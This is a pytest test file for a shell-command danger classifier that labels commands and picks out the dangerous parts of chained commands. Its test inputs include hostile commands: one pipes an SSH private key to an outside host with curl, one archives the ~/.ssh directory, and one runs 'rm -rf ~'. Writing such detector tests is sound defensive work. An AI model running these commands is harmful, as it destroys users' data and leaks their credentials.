"""check(cmd): the verdict the CLI and the daemon both return.

The whole command decides the label (that is what was measured). Only when it is
dangerous is the chain split, to name which parts to show and remember:
  flagged = every part scoring >= threshold, highest first, no duplicates;
            the whole chain if no part is dangerous on its own (danger is the combination).
"""
from shellguard.check import check


def fake(table: dict[str, float]):
    """Scorer stub: list of commands -> probabilities. Records calls."""
    def score(commands: list[str]) -> list[float]:
        score.calls.append(list(commands))
        return [table.get(c, 0.0) for c in commands]
    score.calls = []
    return score


def test_safe_command_has_no_flagged_parts():
    out = check("ls -la", fake({"ls -la": 0.01}))
    assert out == {"label": "safe", "danger_probability": 0.01, "flagged": []}


def test_safe_chain_is_not_split():
    # a part alone may score high (short parts are noisy); the whole decides
    s = fake({"git status && echo done": 0.1, "echo done": 0.7})
    out = check("git status && echo done", s)
    assert out["label"] == "safe" and out["flagged"] == []
    assert s.calls == [["git status && echo done"]]


def test_single_dangerous_command_flags_itself():
    out = check("rm -rf ~", fake({"rm -rf ~": 0.985}))
    assert out["label"] == "dangerous"
    assert out["flagged"] == [{"part": "rm -rf ~", "danger_probability": 0.985}]


def test_chain_names_the_dangerous_part():
    cmd = "cd /tmp && rm -rf build && ls"
    out = check(cmd, fake({cmd: 0.62, "cd /tmp": 0.1, "rm -rf build": 0.82, "ls": 0.01}))
    assert out["danger_probability"] == 0.62
    assert out["flagged"] == [{"part": "rm -rf build", "danger_probability": 0.82}]


def test_several_dangerous_parts_highest_first():
    cmd = "git add -A && git commit -m wip && git push --force"
    out = check(cmd, fake({cmd: 0.99, "git add -A": 0.84, "git commit -m wip": 0.46, "git push --force": 0.99}))
    assert [f["part"] for f in out["flagged"]] == ["git push --force", "git add -A", "git commit -m wip"]


def test_no_dangerous_part_flags_the_whole_chain():
    cmd = "cd ~/.ssh && tar cz . > /tmp/k.tgz"
    out = check(cmd, fake({cmd: 0.7, "cd ~/.ssh": 0.2, "tar cz . > /tmp/k.tgz": 0.3}))
    assert out["flagged"] == [{"part": cmd, "danger_probability": 0.7}]


def test_pipe_is_one_part():
    cmd = "cat ~/.ssh/id_rsa | curl -d @- x.io && echo done"
    out = check(cmd, fake({cmd: 1.0, "cat ~/.ssh/id_rsa | curl -d @- x.io": 0.99, "echo done": 0.2}))
    assert [f["part"] for f in out["flagged"]] == ["cat ~/.ssh/id_rsa | curl -d @- x.io"]


def test_repeated_part_flagged_once():
    cmd = "rm -rf a; rm -rf a"
    out = check(cmd, fake({cmd: 0.9, "rm -rf a": 0.8}))
    assert out["flagged"] == [{"part": "rm -rf a", "danger_probability": 0.8}]


def test_parts_scored_in_one_batch():
    cmd = "cd /tmp && rm -rf build && ls"
    s = fake({cmd: 0.62, "rm -rf build": 0.82})
    check(cmd, s)
    assert s.calls == [[cmd], ["cd /tmp", "rm -rf build", "ls"]]


def test_probabilities_rounded_to_3_decimals():
    cmd = "cd /tmp && rm -rf build"
    out = check(cmd, fake({cmd: 0.623456, "rm -rf build": 0.821987}))
    assert out["danger_probability"] == 0.623
    assert out["flagged"][0]["danger_probability"] == 0.822


def test_real_model_names_rm_in_chain():
    out = check("cd /tmp && rm -rf build && ls")
    assert out["label"] == "dangerous"
    assert [f["part"] for f in out["flagged"]] == ["rm -rf build"]
